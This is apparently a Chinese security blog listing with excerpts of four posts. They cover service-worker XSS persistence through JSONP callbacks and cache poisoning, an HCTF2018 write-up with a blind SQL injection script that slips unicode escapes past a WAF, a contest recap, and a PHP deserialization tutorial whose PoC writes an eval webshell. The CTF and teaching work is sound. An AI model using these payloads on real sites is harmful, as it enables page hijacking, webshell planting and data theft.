<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 拦截特定的Url，如果请求是对应的Url，则返回攻击的response</span><br><span class="line">self.addEventListener(&apos;fetch&apos;, function (event) &#123;  </span><br><span class="line">    var url = event.request.clone(); </span><br><span class="line">    body = &apos;&lt;script&gt;alert(&quot;test&quot;)&lt;/script&gt;&apos;;</span><br><span class="line">    init = &#123;headers: &#123; &apos;Content-Type&apos;: &apos;text/html&apos; &#125;&#125;;</span><br><span class="line">    if(url.url==&apos;http://localhost/reurl.html&apos;)&#123;</span><br><span class="line">        res  = new Response(body,init);</span><br><span class="line">        event.respondWith(res.clone());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h3 id="jsonp回调接口"><a href="#jsonp回调接口" class="headerlink" title="jsonp回调接口"></a>jsonp回调接口</h3><p>利用储值型X点写入下面的代码</p>
<p>当JSONP接口存在缺陷时，比如没有校验回调名。导致返回内容可控<br>比如：url?callback=importScript(…)<br>返回<code>importScript(...)</code><br>代码实现如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// JSONP 回调名缺少校验</span><br><span class="line">$cb_name = $_GET[&apos;callback&apos;];</span><br><span class="line">$cb_data = time();</span><br><span class="line"></span><br><span class="line">header(&apos;Content-Type: application/javascript&apos;);</span><br><span class="line">echo(&quot;$cb_name($cb_data)&quot;);</span><br></pre></td></tr></table></figure>

<p>attack_js</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">	var url=&quot;//localhost/getdata?callback=importScripts(&apos;//third.com/sw.js?g&apos;)&quot;;</span><br><span class="line">	if (&apos;serviceWorker&apos; in navigator) &#123;</span><br><span class="line"> navigator.serviceWorker.register(url)</span><br><span class="line"> .then(function(registration) &#123;</span><br><span class="line"> console.log(&apos;ServiceWorker registration successful with scope: &apos;, registration.scope);</span><br><span class="line"> &#125;)</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>这里面callback回调的事件就相当于sw脚本。当js被执行之后会注册一个sw脚本,内容是回调的事件<br><img src="https://i.loli.net/2018/11/05/5be04f7b70f25.png" alt><br><img src="https://i.loli.net/2018/11/05/5be04f9d988ca.png" alt></p>
<p>或者鸡肋上传一个html到网站下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=utf-8&quot; /&gt; </span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">	var url=&quot;//localhost/getdata?callback=importScripts(&apos;//third.com/sw.js?g&apos;)&quot;;</span><br><span class="line">	if (&apos;serviceWorker&apos; in navigator) &#123;</span><br><span class="line"> navigator.serviceWorker.register(url)</span><br><span class="line"> .then(function(registration) &#123;</span><br><span class="line"> console.log(&apos;ServiceWorker registration successful with scope: &apos;, registration.scope);</span><br><span class="line"> &#125;)</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">it&apos;s nothing</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h2 id="局限"><a href="#局限" class="headerlink" title="局限"></a>局限</h2><ul>
<li>存在有缺陷的 JSONP 接口</li>
<li>JSONP 的目录尽可能浅（最好在根目录下），如果放在域的根目录下，将会收到这个域下的所有fetch事件</li>
<li>JSONP 返回的 Content-Type 必须是 JS 类型</li>
<li>存在 XSS 的页面</li>
</ul>
<p>在网上看到一个师傅这样作例,引用一下：<br>service worker文件被放在这个域的根目录下，这意味着service worker和网站同源。换句话说，这个service work将会收到这个域下的所有fetch事件。如果我将service worker文件注册为/example/sw.js，那么，service worker只能收到/example/路径下的fetch事件（例如： /example/page1/, /example/page2/）</p>
<h2 id="Cache缓存污染"><a href="#Cache缓存污染" class="headerlink" title="Cache缓存污染"></a>Cache缓存污染</h2><p>前文的攻击不涉及cache里的资源,进行的是协商缓存，下面说一下强缓存的利用。</p>
<h2 id="请求资源"><a href="#请求资源" class="headerlink" title="请求资源"></a>请求资源</h2><p>如果使用cache.put方法，则请求的资源成功后会存在Cache Storage里。如果fetch里写了caches.match(event.request)方法，则每次请求时会先从caches找缓存来优先返回给请求页面。若没有缓存，再进行新的缓存操作。</p>
<p>下面是一个缓存读取/判断的demo</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">// 拦截特定的Url，如果请求是对应的Url，则返回攻击的response。否则用Fetch请求网络上原本的url，进行本地缓存(为了不影响正常功能))</span><br><span class="line">self.addEventListener(&apos;fetch&apos;, function (event) &#123;  </span><br><span class="line">        event.respondWith(</span><br><span class="line">            //console.log(event.request)</span><br><span class="line">        caches.match(event.request).then(function(res)&#123;</span><br><span class="line">        if(res)&#123;//如果有缓存则使用缓存</span><br><span class="line">        return res;</span><br><span class="line">        &#125;</span><br><span class="line">        return requestBackend(event);//没缓存就进行缓存</span><br><span class="line">        &#125;)</span><br><span class="line">        )</span><br><span class="line">   &#125;);</span><br><span class="line">   </span><br><span class="line">function requestBackend(event)&#123;  </span><br><span class="line">        var url = event.request.clone();  </span><br><span class="line">        console.log(url)  //打印内容是打印到请求页面</span><br><span class="line">        if(url.url==&apos;http://localhost/reurl.html&apos;)&#123;//判断是否为需要劫持的资源</span><br><span class="line">    </span><br><span class="line">        return new Response(&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;, &#123;headers: &#123; &apos;Content-Type&apos;: &apos;text/html&apos; &#125;&#125;)</span><br><span class="line">        &#125;</span><br><span class="line">        return fetch(url).then(function(res)&#123;</span><br><span class="line">        //检测是否为有效响应</span><br><span class="line">        if(!res || res.status !== 200 || res.type !== &apos;basic&apos;)&#123;</span><br><span class="line">        return res;</span><br><span class="line">        &#125;</span><br><span class="line">        var response = res.clone();</span><br><span class="line">        caches.open(&apos;v1&apos;).then(function(cache)&#123;  //打开v1缓存进行存储</span><br><span class="line">        cache.put(event.request, response);</span><br><span class="line">        &#125;);</span><br><span class="line">    </span><br><span class="line">        return res;</span><br><span class="line">        &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>前几天看ED师傅的研究,发现这种好玩但是鸡肋的方法。上面提到cache.put的方法把js资源添加到Cache Storage，其实如果我们用cache.put把恶意代码插入,覆盖原始的js数据。后果就是当sw请求cahce里的资源时会执行恶意代码。比如workbox会先从缓存读取静态资源,我们用异步请求将恶意代码无限覆盖这个缓存时：</p>
<p>控制台输入下面的恶意代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">async function replay() &#123;</span><br><span class="line">    const name = &apos;xx&apos;</span><br><span class="line">    const url = &apos;xx&apos;</span><br><span class="line">    const payload = `</span><br><span class="line">alert(1);</span><br><span class="line">`</span><br><span class="line">    let cache = await caches.open(name);</span><br><span class="line">    let req = new Request(url);</span><br><span class="line">    let res = new Response(payload + replay + &apos;;replay()&apos;);   //执行alert+写入cache内容+执行fn</span><br><span class="line">    setInterval(_ =&gt; &#123;</span><br><span class="line">      cache.put(req, res.clone());</span><br><span class="line">    &#125;, 500);</span><br><span class="line">&#125;</span><br><span class="line">replay();</span><br></pre></td></tr></table></figure>

<p>就可以在cache Storage里看到500ms刷新并覆盖一次的js资源。<br><img src="https://i.loli.net/2018/11/05/5be0502e0dd09.png" alt></p>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>Service Worker API(<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API</a>)</p>
<p>浏览器缓存知识(<a href="https://www.cnblogs.com/lyzg/p/5125934.html" target="_blank" rel="noopener">https://www.cnblogs.com/lyzg/p/5125934.html</a>)</p>

                
            </div>
            <div class="continue">
            <a href="/2018/11/14/RootkitXSS֮ServiceWorker/">
            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2018/11/13/HCTF题解/"> 
                    HCTF2018线上赛部分WriteUp 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2018-11-13   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="HCTF题解"><a href="#HCTF题解" class="headerlink" title="HCTF题解"></a>HCTF题解</h1><h1 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>提示只有admin才能查看</p>
<p>注册账号功能，发现注册大写和小写会提示重名注册。<br>也就是说 ADMIN&lt;=&gt;admin</p>
<p>有一篇文章将Unicode安全，提到的一个python函数canonical_username，这个函数会把类似的unicode字符做一个与chrome的地址栏里相似的转换，举个例子<br>BIG会被转换为big。ᴬᴬᴬ，经过函数处理<br>后变成了AAA</p>
<ol>
<li>我们注册形似ADMIN的名字</li>
<li>后台函数处理把形似ADMIN转换为ADMIN</li>
<li>修改ADMIN的密码，相当于修改admin的密码</li>
<li>登陆admin获得flag</li>
</ol>
<p>相当于一个越权</p>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>Unicode安全：<a href="http://blog.lnyas.xyz/?p=1411" target="_blank" rel="noopener">http://blog.lnyas.xyz/?p=1411</a><br>Unicode近似字合集:<a href="https://www.compart.com/en/unicode/category/Lm" target="_blank" rel="noopener">https://www.compart.com/en/unicode/category/Lm</a></p>
<h1 id="kznoe"><a href="#kznoe" class="headerlink" title="kznoe"></a>kznoe</h1><h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><p>拿到题目发现砝码泄露,down了一份<a href="http://www.zip开始审" target="_blank" rel="noopener">www.zip开始审</a></p>
<p>一眼看到sql文件，打开看看执行了哪些语句，发现后台账号密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO `fish_admin` (`id`, `username`, `password`, `name`, `qq`, `per`) VALUES</span><br><span class="line">(1, &apos;admin&apos;, &apos;21232f297a57a5a743894a0e4a801fc3&apos;, &apos;小杰&apos;, &apos;1503816935&apos;, 1);</span><br></pre></td></tr></table></figure>

<p>登陆失败，被改了密码，开始审计</p>
<h2 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h2><p>整个钓鱼网站的大致结构：<br><img src="https://i.loli.net/2018/11/13/5beac350d6b8e.png" alt><br>根目录index.php跳转页</p>
<h3 id="admin目录"><a href="#admin目录" class="headerlink" title="admin目录"></a>admin目录</h3><p>admin目录下是钓鱼后台的管理,login逻辑判断登陆</p>
<h3 id="include目录。"><a href="#include目录。" class="headerlink" title="include目录。"></a>include目录。</h3><p>include下是配置文件，common入口文件包含了过滤和验证内容，其中:</p>
<ol>
<li>safe.php写了过滤规则，任何GET\POST\COOKIE请求的参数会经过filter<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function waf($string)</span><br><span class="line">&#123;</span><br><span class="line">    $blacklist = &apos;/union|ascii|mid|left|greatest|least|substr|sleep|or|benchmark|like|regexp|if|=|-|&lt;|&gt;|\#|\s/i&apos;; // and updatexml(1,concat(0x7e,database())</span><br><span class="line">    return preg_replace_callback($blacklist, function ($match) &#123;</span><br><span class="line">        return &apos;@&apos; . $match[0] . &apos;@&apos;;</span><br><span class="line">    &#125;, $string);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function safe($string)</span><br><span class="line">&#123;</span><br><span class="line">    if (is_array($string)) &#123;</span><br><span class="line">        foreach ($string as $key =&gt; $val) &#123;</span><br><span class="line">            $string[$key] = safe($val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $string = waf($string);</span><br><span class="line">    &#125;</span><br><span class="line">    return $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>匹配到这些会在关键字前后添加@</p>
<ol start="2">
<li>member根据cookie判断是否已经登陆</li>
<li>founction封装了一些功能函数</li>
<li>db.class一些执行的sql语句</li>
</ol>
<h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><h3 id="ip"><a href="#ip" class="headerlink" title="ip"></a>ip</h3><p>刚开始审的时候看到了insert把ip入库，而且ip的获取是这样的：<br><img src="https://i.loli.net/2018/11/13/5beac380388eb.jpg" alt><br>不用经过safe的过滤，但是下面的ip2long会把超限度的ip置空，因此ip注入行不通</p>
<h3 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h3><p>因为有全局过滤safe，所以一开始在想可不可以bypass掉，用hex绕过is_number的检测，使我们注入的语句不会经过filter。确实成功执行了我用hex传入的语句，但是mysql仅仅是把hex的值入库了，也无法进行二次利用。</p>
<h3 id="member-php"><a href="#member-php" class="headerlink" title="member.php"></a>member.php</h3><p>当时他们说可以用json形式的cookie注入,unicode编码绕过于是去看cookie逻辑登陆的地方</p>
<p><img src="https://i.loli.net/2018/11/13/5beac35ebedb4.png" alt></p>
<p>cookie传入参数login_data解析查库，用了json_decode，那么就可以用unicode编码无视过滤<br><img src="https://i.loli.net/2018/11/13/5beac38e39abe.png" alt></p>
<p>剩下的就是编写tamper脚本了，把payload替换成unicode。但是看到了微笑师傅的一个py脚本，不借助sqlmap，觉得写的很好，贴出来</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = &apos;http://kzone.2018.hctf.io/include/common.php&apos;</span><br><span class="line">str1 = string.ascii_letters+string.digits+&apos;&#123;&#125;!@#$*&amp;_,&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def check(payload):</span><br><span class="line">    cookie=&#123;</span><br><span class="line">        &apos;PHPSESSID&apos;:&apos;8ehnp28ccr4ueh3gnfc3uqtau1&apos;,</span><br><span class="line">        &apos;islogin&apos;:&apos;1&apos;,</span><br><span class="line">        &apos;login_data&apos;:payload</span><br><span class="line">    &#125;</span><br><span class="line">    try:</span><br><span class="line">        requests.get(url,cookies=cookie,timeout=3)</span><br><span class="line">        return 0</span><br><span class="line">    except:</span><br><span class="line">        return 1</span><br><span class="line"></span><br><span class="line">result=&apos;&apos;</span><br><span class="line">for i in range(1,33):</span><br><span class="line">    for j in str1:</span><br><span class="line">        payload = &apos;&#123;&quot;admin_user&quot;:&quot;admin\&apos;/**/and/**/\\u0069f(\\u0061scii(\\u0073ubstr((select/**/table_name/**/from/**/inf\\u006Frmation_schema.tables/**/where/**/table_schema\\u003ddatabase()/**/limit/**/0,1),%s,1))\\u003d\&apos;%s\&apos;,\\u0073leep(4),1)/**/and/**/\&apos;1&quot;&#125;&apos;% (str(i),ord(j))</span><br><span class="line">        payload = &apos;&#123;&quot;admin_user&quot;:&quot;admin\&apos;/**/and/**/\\u0069f(\\u0061scii(\\u0073ubstr((select/**/F1a9/**/from/**/F1444g),%s,1))\\u003d%s,\\u0073leep(4),1)/**/and/**/\&apos;1&quot;,&quot;admin_pass&quot;:&quot;123&quot;&#125;&apos;% (str(i),ord(j))      </span><br><span class="line">        #print(&apos;[+]&apos;+payload)</span><br><span class="line">        if check(payload):     </span><br><span class="line">            result += j</span><br><span class="line">            break</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>

<p>只要是请求的页面包含common.php此脚本都能行得通，因为会引入member.php</p>

                
            </div>
            <div class="continue">
            <a href="/2018/11/13/HCTF题解/">
            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2018/10/22/ISCC2018 信阳杯线下赛小结/"> 
                    ISCC2018 信阳杯线下赛小结 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2018-10-22   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/">ctf</a></li></ul>
            </div>
            <div class="content">
                
                <p>自己巨大的锅..感觉本能拿第一的，却只水了个第二。</p>
<p>从这篇起以后的日子闭关反思</p>
<h2 id="线下ctf"><a href="#线下ctf" class="headerlink" title="线下ctf"></a>线下ctf</h2><p>上午的线下ctf就不说了,一个misc两个逆向。web狗：？？？<br>而且misc巨坑，感觉也是比脑洞，b32出来了对比hex还原再crc32。当时B32解出来有乱码，一直在测试编码的道路上，但结束后问了西工的师傅们才发现路走偏了。要学会习惯用winhex分析，跟原始的zip比对….这就解释了为什么有个504的文件头了..总之ctf体验极差</p>
<h2 id="高地赛"><a href="#高地赛" class="headerlink" title="高地赛"></a>高地赛</h2><p>当时拿到题目是两个私地，一个pwn，一个web.高地也是一个pwn<br>看到网上有这么个吐槽：<br>选手：“ISCC你又出新题啦！”</p>
<p>当时看到题,第一反应是17年的原题,ez的前端太好辨识了..<br>最扯淡的是，给了Mongodb的配置和17年的也一样..甚至连后台账号密码都没变。不过一开始我万能密码也进去了。但自己菜的也是真实，作为第一个打全场的队伍，后来权限没稳住又被别人反超…</p>
<p>Always onload，还有很多要学的</p>

                
            </div>
            <div class="continue">
            <a href="/2018/10/22/ISCC2018 信阳杯线下赛小结/">
            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2018/09/13/四个实例递进php反序列化/"> 
                    四个实例递进php反序列化 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2018-09-13   
                </a>
                
                
                
                    
            </div>
            <div class="content">
                
                <p>##声明<br>文章首发于安全客：<a href="https://www.anquanke.com/post/id/159206" target="_blank" rel="noopener">https://www.anquanke.com/post/id/159206</a></p>
<h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p>最近在总结php序列化相关的知识，看了好多前辈师傅的文章，决定对四个理解难度递进的序列化思路进行一个复现剖析。包括最近Blackhat议题披露的phar拓展php反序列化漏洞攻击面。前人栽树，后人乘凉，担着前辈师傅们的辅拓前行！</p>
<h2 id="D0g3"><a href="#D0g3" class="headerlink" title="D0g3"></a>D0g3</h2><p>为了让大家进入状态，来一道简单的反序列化小题，新来的表哥们可以先学习一下php序列化和反序列化。顺便安利一下D0g3小组的平台，后面会有题不断上新哦~<br>题目平台地址：<a href="http://ctf.d0g3.cn" target="_blank" rel="noopener">http://ctf.d0g3.cn</a><br>题目入口：<a href="http://120.79.33.253:9001" target="_blank" rel="noopener">http://120.79.33.253:9001</a></p>
<p>页面给了源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">$KEY = &quot;D0g3!!!&quot;;</span><br><span class="line">$str = $_GET[&apos;str&apos;];</span><br><span class="line">if (unserialize($str) === &quot;$KEY&quot;)</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;$flag&quot;;</span><br><span class="line">&#125;</span><br><span class="line">show_source(__FILE__);</span><br></pre></td></tr></table></figure>

<p>提醒大家补充php序列化知识的水题~</p>
<p>直接上传<code>s:7:&quot;D0g3!!!&quot;</code>即可get flag</p>
<h2 id="绕过魔法函数的反序列化漏洞"><a href="#绕过魔法函数的反序列化漏洞" class="headerlink" title="绕过魔法函数的反序列化漏洞"></a>绕过魔法函数的反序列化漏洞</h2><p>漏洞编号CVE-2016-7124</p>
<h3 id="魔法函数-sleep-和-wakeup"><a href="#魔法函数-sleep-和-wakeup" class="headerlink" title="魔法函数__sleep() 和 __wakeup()"></a>魔法函数__sleep() 和 __wakeup()</h3><p><strong>php文档中定义__wakeup():</strong></p>
<p>unserialize() 执行时会检查是否存在一个 <strong>wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。</strong>wakeup()经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。__sleep()则相反，是用在序列化一个对象时被调用</p>
<p><img src="https://i.loli.net/2018/09/06/5b90f6d1d8152.png" alt></p>
<h3 id="漏洞剖析"><a href="#漏洞剖析" class="headerlink" title="漏洞剖析"></a>漏洞剖析</h3><p>PHP5 &lt; 5.6.25<br>PHP7 &lt; 7.0.10<br>PHP官方给了示例：<a href="https://bugs.php.net/bug.php?id=72663" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=72663</a><br>这个漏洞核心：<strong>序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</strong>比如下面这个类构造：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class hpdoger&#123;</span><br><span class="line">    public $a = &apos;nice to meet u&apos;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>序列化这个类得到的结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:7:&quot;hpdoger&quot;:1:&#123;s:1:&quot;a&quot;;s:6:&quot;nice to meet u&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>简单解释一下这个序列化字符串：<br>O代表结构类型为：类，7表示类名长度，接着是类名、属性（成员）个数<br>大括号内分别是：属性名类型、长度、名称；值类型、长度、值</p>
<p>正常情况下，反序列化一个类得到的结果：<br><img src="https://i.loli.net/2018/09/06/5b90f7f9ae0d0.jpg" alt></p>
<p>析构方法和__wakeup都能够执行</p>
<p>如果我们把传入的序列化字符串的属性个数更改成大于1的任何数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:7:&quot;hpdoger&quot;:2:&#123;s:1:&quot;a&quot;;s:6:&quot;u know&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>得到的结果如图，__wakeup没有被执行，但是执行了析构函数<br><img src="https://i.loli.net/2018/09/06/5b90f8ecc8319.png" alt></p>
<p>假如我们的demo是这样的呢?</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">    var $a = &quot;test&quot;;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        $fp = fopen(&quot;D:\\phpStudy\\PHPTutorial\\WWW\\test\\shell.php&quot;,&quot;w&quot;);</span><br><span class="line">        fputs($fp,$this-&gt;a);</span><br><span class="line">        fclose($fp);</span><br><span class="line">    &#125;</span><br><span class="line">    function __wakeup()</span><br><span class="line">        &#123;</span><br><span class="line">            foreach(get_object_vars($this) as $k =&gt; $v) &#123;</span><br><span class="line">                    $this-&gt;$k = null;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">$hpdoger = $_POST[&apos;hpdoger&apos;];</span><br><span class="line">$clan = unserialize($hpdoger);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>每次反序列化是都会调用__wakeup从而把$a值清空。但是，如果我们绕过wakeup不就能写Shell了？既然反序列化的内容是可控的，就利用上述的方法绕过wakeup。</p>
<p>poc:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;A&quot;:2:&#123;s:1:&quot;a&quot;;s:27:&quot;&lt;?php eval($_POST[&quot;hp&quot;]);?&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="序列化漏洞常见的魔法函数"><a href="#序列化漏洞常见的魔法函数" class="headerlink" title="序列化漏洞常见的魔法函数"></a>序列化漏洞常见的魔法函数</h3><p>__construct():当一个类被创建时自动调用<br>__destruct():当一个类被销毁时自动调用<br>__invoke():当把一个类当作函数使用时自动调用<br>__tostring():当把一个类当作字符串使用时自动调用<br>__wakeup():当调用unserialize()函数时自动调用<br>__sleep():当调用serialize()函数时自动调用<br>__call():当要调用的方法不存在或权限不足时自动调用</p>
<h2 id="Session反序列化漏洞"><a href="#Session反序列化漏洞" class="headerlink" title="Session反序列化漏洞"></a>Session反序列化漏洞</h2><h3 id="Session序列化机制"><a href="#Session序列化机制" class="headerlink" title="Session序列化机制"></a>Session序列化机制</h3><p>提到这个漏洞，就得先知道什么叫Session序列化机制。</p>
<p>当session_start()被调用或者php.ini中session.auto_start为1时，PHP内部调用会话管理器，访问用户session被序列化以后，存储到指定目录（默认为/tmp）。</p>
<p>PHP处理器的三种序列化方式：<br>| 处理器         | 对应的存储格式    |<br>| —————— |:———————|<br>| php_binary      | 键名的长度对应的ASCII字符＋键名＋经过serialize() 函数反序列处理的值 |<br>| php           | 键名＋竖线＋经过serialize()函数反序列处理的值   |<br>|php_serialize |serialize()函数反序列处理数组方式|</p>
<p>配置文件php.ini中含有这几个与session存储配置相关的配置项：</p>
